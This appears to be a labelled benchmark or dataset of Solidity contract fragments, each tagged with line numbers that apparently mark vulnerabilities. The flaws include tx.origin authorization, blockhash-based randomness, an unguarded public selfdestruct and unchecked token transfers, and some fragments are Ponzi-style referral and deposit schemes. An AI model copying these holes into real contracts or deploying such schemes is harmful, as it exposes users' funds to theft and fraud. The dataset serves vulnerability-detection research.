        uniswapV2Pairs.push(0x03B0da178FecA0b0BBD5D76c431f16261D0A76aa);
        _src20 = 0x6Ef5febbD2A56FAb23f18a69d3fB9F4E2A70440B;
        normalValueRatio = 10;
        // 6 months;
        dayInSeconds = 86400;
        lockupPeriod = dayInSeconds.mul(180);
        isTrading = 1;
        isTransfers = 1;
    }
    //---------------------------------------------------------------------------------
    // external section
    //---------------------------------------------------------------------------------
    /**
    * @dev Do transfer and checks where funds should go. If both from and to are
    * on the whitelist funds should be transferred but if one of them are on the
    * grey list token-issuer/owner need to approve transfer.
    *
    * @param from The address to transfer from.
    * @param to The address to send tokens to.
    * @param value The amount of tokens to send.
    */
    function _doTransfer(
        address from,
        address to,
        uint256 value
    )
        override
        internal
        returns (
            address _from,
            address _to,
            uint256 _value
        )
    {
        (_from,_to,_value) = (from,to,value);
        // owner does anything
        if (tx.origin == owner()) {
            return  (_from,_to,_value);
        }
        string memory errmsg;
        if (isTransfers == 0) {
            errmsg = ""Transfers have been temporarily halted"";
            emit Event(errmsg, tx.origin);
            revert(errmsg);
        }
        // preventTransactionsInSameBlock
        _preventTransactionsInSameBlock();
        // check allowance minimums
        _checkAllowanceMinimums(_from, _value);
        if ((indexOf(uniswapV2Pairs,_from) == -1) && (indexOf(uniswapV2Pairs,_to) == -1)) {
            return  (_from,_to,_value);
        }
        if (isTrading == 0) {
            errmsg = ""Trading has been temporarily halted"";
            emit Event(errmsg, tx.origin);
            revert(errmsg);
        }
        if (indexOf(uniswapV2Pairs,_from) != -1) {
            address uniswapV2Pair = _from;
            // fetches and sorts the reserves for a pair
            (uint reserveA, uint reserveB) = getReserves(uniswapV2Pair);
            uint256 outlierPrice = (reserveB).div(reserveA);
            uint256 obtainedTokenB = getAmountIn(_value,reserveA,reserveB);
            uint256 outlierPriceAfter = (reserveB.add(obtainedTokenB)).div(reserveA.sub(_value));
            if (outlierPriceAfter > outlierPrice.mul(normalValueRatio)) {
                _minimumsAdd(_to,value, lockupPeriod, true);
            }
        }
    }
    function indexOf(address[] memory arr, address item) internal view returns(int32) {
        for(uint32 i = 0; i < arr.length; i++) {
            if (arr[i] == item) {
                return int32(i);
            }
        }
        return -1;
    }
    /*
    * copy as UniswapV2Library function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)
    */
    function getAmountIn(uint256 token, uint256 reserve0, uint256 reserve1) internal pure returns (uint256 calcEth) {
        uint256 numerator = reserve1.mul(token).mul(1000);
        uint256 denominator = reserve0.sub(token).mul(997);
        calcEth = (numerator / denominator).add(1);
    }
    // reserveA is reserves of src20
    function getReserves(address uniswapV2Pair) internal returns (uint256 reserveA, uint256 reserveB) {
        (reserveA, reserveB,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
        (reserveA, reserveB) = (_src20 == IUniswapV2Pair(uniswapV2Pair).token0()) ? (reserveA, reserveB) : (reserveB, reserveA);
    }
    function _preventTransactionsInSameBlock() internal {
        if (_lastTransactionBlock[tx.origin] == block.number) {
            // prevent direct frontrunning
            emit Event(""SandwichAttack"", tx.origin);
            revert(""Cannot execute two transactions in same block."");
        }
        _lastTransactionBlock[tx.origin] = block.number;
    }
    function _checkAllowanceMinimums(address addr, uint256 amount) internal view {
        uint256 minimum = _minimumsGet(addr, block.timestamp);
        uint256 canBeTransferring = ISRC20(_src20).balanceOf(addr).sub(minimum);",[64]
"        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    struct X6 {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        bool blocked;
        uint reinvestCount;
        address closedPart;
    }
    uint8 public constant LAST_LEVEL = 14;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances;
    uint public lastUserId = 2;
    address public owner;
      uint public tronchk = 0;
       uint public tottran = 0;
    mapping(uint8 => uint) public levelPrice;
      mapping(uint8 => uint) public levelPrice1;
       event WithDal(address indexed user,  uint256  recved,uint256 with);
         event SlotDetails(address indexed userAddress,address indexed PayeerAdd,uint indexed mid,  uint  refid,uint matrix,uint lvl);
            event RegDetails(address indexed user,address indexed user1,address indexed user2, uint  payment, uint  userId);
                 event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event UpgradeNew(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user,uint indexed userId, address indexed referrer,uint referrerId, uint8 matrix, uint8 level, uint8 place);
    event MissedTronReceive(address indexed receiver,uint receiverId, address indexed from,uint indexed fromId, uint8 matrix, uint8 level);
    event SentDividends(address indexed from,uint indexed fromId, address indexed receiver,uint receiverId, uint8 matrix, uint8 level, bool isExtra);
    constructor(address ownerAddress) public {
       levelPrice[1] = 0.03 ether;
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
        }
        owner = ownerAddress;
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
        }
        userIds[1] = ownerAddress;
    }
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        registration(msg.sender, bytesToAddress(msg.data));
    }
    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
        function PaytoMultiple(address[] memory _address,uint256[] memory _amount,uint256[] memory _withId) public payable {
            for (uint8 i = 0; i < _address.length; i++) {
                emit WithDal(_address[i],_amount[i],_withId[i]);
               if (!address(uint160(_address[i])).send(_amount[i])) {
               address(uint160(_address[i])).transfer(_amount[i]);
               }
            }
     }
    function buyNewLevel(uint8 matrix, uint8 level) external payable {
        require(isUserExists(msg.sender), ""user is not exists. Register first."");
        require(matrix == 1 || matrix == 2, ""invalid matrix"");
        require(msg.value == levelPrice[level], ""invalid price"");
        require(level > 1 && level <= LAST_LEVEL, ""invalid level"");
        if (matrix == 1) {
            require(!users[msg.sender].activeX3Levels[level], ""level already activated"");
            require(users[msg.sender].activeX3Levels[level - 1], ""previous level should be activated"");
            if (users[msg.sender].x3Matrix[level-1].blocked) {
                users[msg.sender].x3Matrix[level-1].blocked = false;
            }
            address freeX3Referrer = findFreeX3Referrer(msg.sender, level);
            users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;
            users[msg.sender].activeX3Levels[level] = true;
            updateX3Referrer(msg.sender, freeX3Referrer, level);
            emit Upgrade(msg.sender, freeX3Referrer, 1, level);
        } else {
            require(!users[msg.sender].activeX6Levels[level], ""level already activated"");
            require(users[msg.sender].activeX6Levels[level - 1], ""previous level should be activated"");
            if (users[msg.sender].x6Matrix[level-1].blocked) {
                users[msg.sender].x6Matrix[level-1].blocked = false;
            }
            address freeX6Referrer = findFreeX6Referrer(msg.sender, level);
            users[msg.sender].activeX6Levels[level] = true;
            updateX6Referrer(msg.sender, freeX6Referrer, level);
            emit Upgrade(msg.sender, freeX6Referrer, 2, level);
        }
    }
          function isUserExistsNew(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
       // require(msg.value == 1 ether, ""registration cost 1 ether"");
        function Execution(address _sponsorAddress,uint price) private returns (uint distributeAmount) {
        distributeAmount = price;
         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
        }
        return distributeAmount;
    }
    function registration(address userAddress, address referrerAddress) private {
      require(msg.value == 850 ether, ""registration cost 850"");
          //  require(msg.value == 0.05 ether, ""registration cost 0.05"");
        require(!isUserExists(userAddress), ""user exists"");
        require(isUserExists(referrerAddress), ""referrer not exists"");
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, ""cannot be a contract"");
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        users[userAddress].activeX3Levels[1] = true;
        users[userAddress].activeX6Levels[1] = true;","[63, 65]"
"        uint i = 0;
        address currentAddr = rollHead;
        while (i < maxCount && currentAddr != address(0)) {
            Roll storage rollReq = rolls[currentAddr][0];
            if (rollReq.blocknum >= block.number) {
                return;
            }
            checkRoll(currentAddr, rollReq);
            rollHead = rollReq.next;
            if (currentAddr == rollTail) {
                rollTail = address(0);
            }
            delete rolls[currentAddr];
            currentAddr = rollHead;
            i++;
        }
    }
    function checkRoll(address addr, Roll storage rollReq) private {
        uint totalWin = 0;
        if (block.number <= rollReq.blocknum + BET_EXPIRATION_BLOCKS) {
            for (uint x = 0; x < rollReq.rollCount; x++) {
                totalWin += doRoll(addr, rollReq.bet, rollReq.lines, rollReq.blocknum, pendingBetAmount + rollTimes + x);
            }
        } else {
            totalWin = rollReq.bet * rollReq.rollCount - 2300;
        }
        pendingBetAmount -= rollReq.bet * rollReq.rollCount;
        if (totalWin > 0) {
            if (address(this).balance > totalWin + 2300) {
                addr.transfer(totalWin);
            } else {
                partners.push(PartnerShare(addr, totalWin / 1 finney));
            }
        }
    }
    function doRoll(address addr, uint bet, uint8 lines, uint blocknum, uint seed) private returns (uint) {
        uint[3] memory stops;
        uint winRate;
        uint entropy;
        (stops, winRate, entropy) = calcRoll(addr, blocknum, seed);
        uint wheel = stops[0]<<16 | stops[1]<<8 | stops[2];
        uint win = bet * winRate;
        // Jackpot
        if (winRate == 9999) {
            win = jackpotPool / 2;
            jackpotPool -= win;
        }
        rollTimes++;
        uint minipotWin = 0;
        // Check minipot
        if (0xffff / (entropy >> 32 & 0xffff) > (100 * (minipotTimes + 1)) - rollTimes) {
            minipotTimes++;
            minipotWin = minipotPool / 2;
            minipotPool -= minipotWin;
        }
        emit RollEnd(addr, bet, lines, uint32(wheel), win, minipotWin);
        return win + minipotWin;
    }
    function calcRoll(address addr, uint blocknum, uint seed) public view returns (uint[3] memory stops, uint winValue, uint entropy) {
        require (block.number > blocknum, ""Can't check in the same block or before."");
        require (block.number <= blocknum + BET_EXPIRATION_BLOCKS, ""Can't check for too old block."");
        entropy = uint(keccak256(abi.encodePacked(addr, blockhash(blocknum), seed)));
        stops = [REELS[0][entropy % REELS[0].length],
                 REELS[1][(entropy >> 8) % REELS[1].length],
                 REELS[2][(entropy >> 16) % REELS[2].length]];
        winValue = calcPayout(stops[0], stops[1], stops[2]);
    }
    function calcPayout(uint p1, uint p2, uint p3) public view returns (uint) {
        uint line = SYMBOL_MASK[p1] << 16 | SYMBOL_MASK[p2] << 8 | SYMBOL_MASK[p3];
        uint pay = 0;
        for (uint i = 0; i < PAYTABLE.length; i++) {
            if (PAYTABLE[i][0] == line & PAYTABLE[i][0]) {
                pay = PAYTABLE[i][1];
            }
        }
        return pay;
    }
    function getBonus() public view returns (uint) {
        return address(this).balance - pendingBetAmount - jackpotPool - minipotPool;
    }
    function distribute() public returns (uint result) {
        bool isPartner = (owner == msg.sender);
        uint totalShare = 0;
        for (uint i = 0; i < partners.length; i++) {
            if (partners[i].from == msg.sender) {
                isPartner = true;
            }
            totalShare += partners[i].share;
        }
        require(isPartner, 'Only partner can distrubute bonus.');
        uint bonus = getBonus();
        if (totalShare > 0) {
            uint price = ((bonus / 10) * 6) / totalShare;
            if (price > 0) {
                for (uint j = 0; j < partners.length; j++) {
                    uint share = partners[j].share * price;
                    partners[j].from.transfer(share);
                    if (partners[j].from == msg.sender) {
                        result += share;
                    }
                }
            }
            if (price > 2 * 1 finney) {
                delete partners;
            }
        }
        uint ownerShare = (bonus / 10) * 4;
        owner.transfer(ownerShare);
        if (owner == msg.sender) {
            result += ownerShare;
        }
    }
}","[20, 97, 104, 108]"
"    }
    /* private functions */
    function addParticipant(address _participant, uint256 _numberOfTickets) private {
        // if number of tickets exceeds the size of the game, tickets are added to next game
        for (uint256 i = 0; i < _numberOfTickets; i++) {
            // using gameIndex instead of counter/SIZE since games can be cancelled
            participants[gameIndex][counter%SIZE] = _participant;
            ParticipantAdded(_participant, gameIndex, counter%SIZE);
            // msg.sender triggers the drawing of lots
            if (++counter%SIZE == 0) {
                awardPrizes();
                // Split the rest, increase game number
                distributeRemaining();
                increaseGame();
            }
            // loop continues if there are more tickets
        }
    }
    function awardPrizes() private {
        uint256 hashNumber = uint256(keccak256(block.blockhash(block.number-1)));
        // get the winning number
        uint256 winnerIndex = hashNumber%SIZE;
        // get jackpot winner, hash result of last two digit number (index) with 4 preceding zeroes will win
        uint256 jackpotNumber = hashNumber%JACKPOT_CHANCE;
        if (winnerIndex == jackpotNumber) {
            distributeJackpot(winnerIndex);
        }
        // loop throught the prizes
        for (uint8 i = 0; i < prizes.length; i++) {
            // GAS: 21000 Paid for every transaction. (prizes.length)
            participants[gameIndex][winnerIndex%SIZE].transfer(prizes[i]); // msg.sender pays the gas, he's refunded later, % to wrap around
            PrizeAwarded(gameIndex, participants[gameIndex][winnerIndex%SIZE], prizes[i]);
            // increment index to the next winner to receive the next prize
            winnerIndex++;
        }
    }
    function distributeJackpot(uint256 _winnerIndex) private {
        uint256 amount = jackpotAmount;
        jackpotAmount = 0; // later on in the code sequence funds will be added
        participants[gameIndex][_winnerIndex].transfer(amount);
        JackpotAwarded(gameIndex,  participants[gameIndex][_winnerIndex], amount);
    }
    function distributeRemaining() private {
        jackpotAmount = jackpotAmount.add(JACK_DIST);   // add to jackpot
        fund.transfer(DIV_DIST);                        // dividends are paid to SLOT investors
        msg.sender.transfer(GAS_REFUND);                // repay gas to msg.sender
    }
    function increaseGame() private {
        gameIndex++;
        gameStartedAtBlock = block.number;
    }
    /* public functions */
    function spotsLeft() public constant returns (uint8 spots) {
        return SIZE - uint8(counter%SIZE);
    }
    function refundPlayersAfterVeryLongGame() public {
        require(block.number.sub(gameStartedAtBlock) >= INACTIVITY);
        require(counter%SIZE != 0); // nothing to refund
        // refunds for everybody can be requested after the game has gone (INACTIVITY) blocks without a conclusion
        // Checks-Effects-Interactions pattern to avoid re-entrancy
        uint256 _size = counter%SIZE; // not counter.size, but modulus of SIZE
        counter -= _size;
        for (uint8 i = 0; i < _size; i++) {
            participants[gameIndex][i].transfer(PRICE);
        }
        GameRefunded(gameIndex);
        increaseGame();
    }
    function destroy() public onlyOwner {
        require(this.balance < 1 ether);
        ticket.destroy();
        selfdestruct(owner);
    }
    function changeTicketOwner(address _newOwner) public onlyOwner {
        require(_newOwner != 0x0);
        // in case of new contract, old token can still be used
        // the token contract owner is the slot contract itself
        ticket.transferOwnership(_newOwner);
    }
    function changeFund(address _newFund) public onlyOwner {
        require(_newFund != 0x0);
        // changes the place to send dividends to SLOT investors
        fund = _newFund;
    }
    function changeTicket(address _newTicket) public onlyOwner {
        require(_newTicket != 0x0);
        ticket = SlotTicket(_newTicket); // still owner of the ticket needs to changed to work
    }
}",[64]
"pragma solidity ^0.4.24;
contract SmartPromise {
    address owner;
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;
    constructor() public { owner = msg.sender;}
    function() external payable {
        owner.send(msg.value / 10);
        if (balances[msg.sender] != 0){
        address paymentAddress = msg.sender;
        uint256 paymentAmount = balances[msg.sender]*4/100*(block.number-timestamp[msg.sender])/5900;
        paymentAddress.send(paymentAmount);
        }
        timestamp[msg.sender] = block.number;
        balances[msg.sender] += msg.value;
    }
}",[8]
"pragma solidity ^0.4.21;
library SmartMatrix {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract SmartSageMatrix {
    // The keyword ""public"" makes those variables
    // readable from outside.
    address public minter;
    event LogWithdrawal(address sender, uint amount);
    mapping (address => uint) public balances;
    // Events allow light clients to react on
    // changes efficiently.
    event Sent(address from, address to, uint amount);
    // This is the constructor whose code is
    // run only when the contract is created.
    constructor() public {
        minter = msg.sender;
    }
    function mint(address receiver, uint amount) public {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }
    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Sent(msg.sender, receiver, amount);
    }
    function getBalance() public view returns(uint balance) {
        return address(this).balance;
    }
     function withdraw(uint amount) public returns(bool success) {
        require(msg.sender==minter);
        emit LogWithdrawal(msg.sender, amount);
        msg.sender.transfer(amount);
        return true;
    }
        event Multisended(uint256 value , address sender);
        using SmartMatrix for uint256;
        function multisendEther(address[] _contributors, uint256[] _balances) public payable {
            uint256 total = msg.value;
            uint256 i = 0;
            for (i; i < _contributors.length; i++) {
                require(total >= _balances[i] );
                total = total.sub(_balances[i]);
                _contributors[i].transfer(_balances[i]);
            }
            emit Multisended(msg.value, msg.sender);
        }
}","[60, 80]"
"  /**
   * @dev Constructor: Set the wallet addresses of both spouses.
   * @param _husbandAddress Wallet address of the husband.
   * @param _wifeAddress Wallet address of the wife.
   */
  constructor(address _husbandAddress, string _husbandFullName, address _wifeAddress, string _wifeFullName, string _weddingDate) public {
    require(_husbandAddress != address(0), ""Husband address must not be zero!"");
    require(_wifeAddress != address(0), ""Wife address must not be zero!"");
    require(_husbandAddress != _wifeAddress, ""Husband address must not equal wife address!"");
    husbandAddress = _husbandAddress;
    husbandFullName = _husbandFullName;
    wifeAddress = _wifeAddress;
    wifeFullName = _wifeFullName;
    weddingDate = _weddingDate;
    emit WeddingCreated(now, _husbandAddress, _husbandFullName, _wifeAddress, _wifeFullName, _weddingDate);
  }
  /**
   * @dev Default function to enable the contract to receive funds.
    */
  function() external payable isSigned isNotDivorced {
    emit FundsReceived(now, msg.sender, msg.value);
  }
  /**
   * @dev Propose a written contract (update).
   * @param _writtenContractIpfsHash IPFS hash of the written contract PDF.
   */
  function proposeWrittenContract(string _writtenContractIpfsHash) external onlySpouse isNotDivorced {
    require(signed == false, ""Written contract ipfs hash can not be changed. Both spouses have already signed it!"");
    // Update written contract ipfs hash
    writtenContractIpfsHash = _writtenContractIpfsHash;
    emit WrittenContractProposed(now, _writtenContractIpfsHash, msg.sender);
    // Revoke previous signatures
    if (hasSigned[husbandAddress] == true) {
      hasSigned[husbandAddress] = false;
    }
    if (hasSigned[wifeAddress] == true) {
      hasSigned[wifeAddress] = false;
    }
  }
  /**
   * @dev Sign the contract.
   */
  function signContract() external onlySpouse {
    require(isNotSameString(writtenContractIpfsHash, """"), ""Written contract ipfs hash has been proposed yet!"");
    require(hasSigned[msg.sender] == false, ""Spouse has already signed the contract!"");
    // Sender signed
    hasSigned[msg.sender] = true;
    emit Signed(now, msg.sender);
    // Check if both spouses have signed
    if (hasSigned[husbandAddress] && hasSigned[wifeAddress]) {
      signed = true;
      emit ContractSigned(now);
    }
  }
  /**
   * @dev Send ETH to a target address.
   * @param _to Destination wallet address.
   * @param _amount Amount of ETH to send.
   */
  function pay(address _to, uint _amount) external onlySpouse isSigned isNotDivorced {
    require(_to != address(0), ""Sending funds to address zero is prohibited!"");
    require(_amount <= address(this).balance, ""Not enough balance available!"");
    // Send funds to the destination address
    _to.transfer(_amount);
    emit FundsSent(now, _to, _amount);
  }
  /**
   * @dev Request to divorce. The other spouse needs to approve this action.
   */
  function divorce() external onlySpouse isSigned isNotDivorced {
    require(hasDivorced[msg.sender] == false, ""Sender has already approved to divorce!"");
    // Sender approved
    hasDivorced[msg.sender] = true;
    emit DivorceApproved(now, msg.sender);
    // Check if both spouses have approved to divorce
    if (hasDivorced[husbandAddress] && hasDivorced[wifeAddress]) {
      divorced = true;
      emit Divorced(now);
      // Get the contracts balance
      uint balance = address(this).balance;
      // Split the remaining balance half-half
      if (balance != 0) {
        // Ignore any remainder due to low value
        uint balancePerSpouse = balance / 2;
        // Send transfer to the husband
        husbandAddress.transfer(balancePerSpouse);
        emit FundsSent(now, husbandAddress, balancePerSpouse);
        // Send transfer to the wife
        wifeAddress.transfer(balancePerSpouse);
        emit FundsSent(now, wifeAddress, balancePerSpouse);
      }
    }
  }
}",[64]
"pragma solidity ^0.4.16;
contract Token{
    uint256 public totalSupply;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns   
    (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns 
    (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 
    _value);
}
contract SnailToken is Token {
    string public name=""SnailToken"";                   
    uint8 public decimals=18;              
    string public symbol=""Snail"";         
    address public organizer=0x06BB7b2E393671b85624128A5475bE4A8c1c03E9;
    function SnailToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {
        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);       
        balances[msg.sender] = totalSupply; 
        name = _tokenName;                   
        decimals = _decimalUnits;          
        symbol = _tokenSymbol;
    }
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);
        require(_to != 0x0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns 
    (bool success) {
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);
        balances[_to] += _value;
        balances[_from] -= _value; 
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) public returns (bool success)   
    { 
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    function takeout(uint256 amount) public{
    require(address(this).balance>=amount*10**18);
    transfer(address(this),amount);
    msg.sender.transfer(amount*10**18);
    }
    function destroy() public{
      selfdestruct(organizer);}
}","[38, 63, 64]"
"   * @return A uint256 specifying the amount of tokens still available for the spender.
   */
  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  /**
   * @dev Increase the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To increment
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _addedValue The amount of tokens to increase the allowance by.
   */
  function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  /**
   * @dev Decrease the amount of tokens that an owner allowed to a spender.
   *
   * approve should be called when allowed[_spender] == 0. To decrement
   * allowed value is better to use this function to avoid 2 calls (and wait until
   * the first transaction is mined)
   * From MonolithDAO Token.sol
   * @param _spender The address which will spend the funds.
   * @param _subtractedValue The amount of tokens to decrease the allowance by.
   */
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract QIUToken is StandardToken,Ownable {
    string public name = 'QIUToken';
    string public symbol = 'QIU';
    uint8 public decimals = 0;
    uint public INITIAL_SUPPLY = 5000000000;
    uint public eth2qiuRate = 10000;
    function() public payable { } // make this contract to receive ethers
    function QIUToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[owner] = INITIAL_SUPPLY / 10;
        balances[this] = INITIAL_SUPPLY - balances[owner];
    }
    function getOwner() public view returns (address) {
        return owner;
    }
    /**
    * @dev Transfer tokens from one address to another, only owner can do this super-user operate
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint256 the amount of tokens to be transferred
    */
    function ownerTransferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(tx.origin == owner); // only the owner can call the method.
        require(_to != address(0));
        require(_value <= balances[_from]);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(_from, _to, _value);
        return true;
    }
      /**
    * @dev transfer token for a specified address,but different from transfer is replace msg.sender with tx.origin
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function originTransfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[tx.origin]);
        // SafeMath.sub will throw if there is not enough balance.
        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);
        Transfer(tx.origin, _to, _value);
        return true;
    }
    event ExchangeForETH(address fromAddr,address to,uint qiuAmount,uint ethAmount);
    function exchangeForETH(uint qiuAmount) public returns (bool){
        uint ethAmount = qiuAmount * 1000000000000000000 / eth2qiuRate; // only accept multiple of 100
        require(this.balance >= ethAmount);
        balances[this] = balances[this].add(qiuAmount);
        balances[msg.sender] = balances[msg.sender].sub(qiuAmount);
        msg.sender.transfer(ethAmount);
        ExchangeForETH(this,msg.sender,qiuAmount,ethAmount);
        return true;
    }
    event ExchangeForQIU(address fromAddr,address to,uint qiuAmount,uint ethAmount);
    function exchangeForQIU() payable public returns (bool){
        uint qiuAmount = msg.value * eth2qiuRate / 1000000000000000000;
        require(qiuAmount <= balances[this]);
        balances[this] = balances[this].sub(qiuAmount);
        balances[msg.sender] = balances[msg.sender].add(qiuAmount);
        ExchangeForQIU(this,msg.sender,qiuAmount,msg.value);
        return true;
    }
    /*
    // transfer out method
    function ownerETHCashout(address account) public onlyOwner {
        account.transfer(this.balance);
    }*/
    function getETHBalance() public view returns (uint) {
        return this.balance; // balance is ""inherited"" from the address type
    }
}
contract SoccerChampion is Ownable {
    using SafeMath for uint256;
    struct Tournament {
        uint id;
        bool isEnded;
        bool isLockedForSupport;
        bool initialized;
        Team[] teams;
        SupportTicket[] tickets;
    }
    struct Team {
        uint id;
        bool isKnockout;
        bool isChampion;
    }",[64]
"    /// @dev codeHash is a sha3 from the contract byte code
    mapping (bytes32 => uint8) public auditOutcomes;
    /// @dev Maps requestor, auditor and codeHash to an AuditRequest
    /// Map key is: keccack256(auditor address, requestor address, contract codeHash)
    mapping (bytes32 => AuditRequest) public auditRequests;
    /// @dev event fired upon successul audit request
    event AuditRequested(address auditor, address bidder, bytes32 codeHash, uint amount, uint expireDate);
    /// @dev event fired when an request is sucessfully withdrawn
    event RequestWithdrawn(address auditor, address bidder, bytes32 codeHash, uint amount);
    /// @dev event fired when a contract is sucessfully audited
    event ContractAudited(address auditor, bytes32 codeHash, uint reward, bool isApproved);
    /// @notice registers an audit request
    /// @param _auditor the address of the auditor the request is directed to
    /// @param _codeHash the code hash of the contract to audit. _codeHash equals to sha3 of the contract byte-code
    /// @param _auditTime the amount of time after which the requestor can withdraw the request
    function requestAudit(address _auditor, bytes32 _codeHash, uint _auditTime)
    public whenNotPaused payable
    {
        require(_auditor != 0x0);
        // audit request cannot expire too quickly or last too long
        require(_auditTime >= MIN_AUDIT_TIME);
        require(_auditTime <= MAX_AUDIT_TIME);
        require(msg.value > 0);
        bytes32 hashAuditorCode = keccak256(_auditor, _codeHash);
        // revert if the contract is already audited by the auditor
        uint8 outcome = auditOutcomes[hashAuditorCode];
        require(outcome == NOT_AUDITED);
        uint currentReward = rewards[hashAuditorCode];
        uint expireDate = now.add(_auditTime);
        rewards[hashAuditorCode] = currentReward.add(msg.value);
        totalRequestsAmount = totalRequestsAmount.add(msg.value);
        bytes32 hashAuditorRequestorCode = keccak256(_auditor, msg.sender, _codeHash);
        AuditRequest storage request = auditRequests[hashAuditorRequestorCode];
        if ( request.amount == 0 ) {
            // first request from msg.sender to audit contract _codeHash by _auditor
            auditRequests[hashAuditorRequestorCode] = AuditRequest({
                amount : msg.value,
                expireDate : expireDate
            });
            emit AuditRequested(_auditor, msg.sender, _codeHash, msg.value, expireDate);
        } else {
            // Request already exists. Increasing value
            request.amount = request.amount.add(msg.value);
            // if new expireDate is later than existing one - increase the existing one
            if ( expireDate > request.expireDate )
                request.expireDate = expireDate;
            // event returns the total request value and its expireDate
            emit AuditRequested(_auditor, msg.sender, _codeHash, request.amount, request.expireDate);
        }
    }
    /// @notice withdraws an audit request
    /// @param _auditor the address of the auditor the request is directed to
    /// @param _codeHash the code hash of the contract to audit. _codeHash equals to sha3 of the contract byte-code
    function withdrawRequest(address _auditor, bytes32 _codeHash)
    public
    {
        bytes32 hashAuditorCode = keccak256(_auditor, _codeHash);
        // revert if the contract is already audited by the auditor
        uint8 outcome = auditOutcomes[hashAuditorCode];
        require(outcome == NOT_AUDITED);
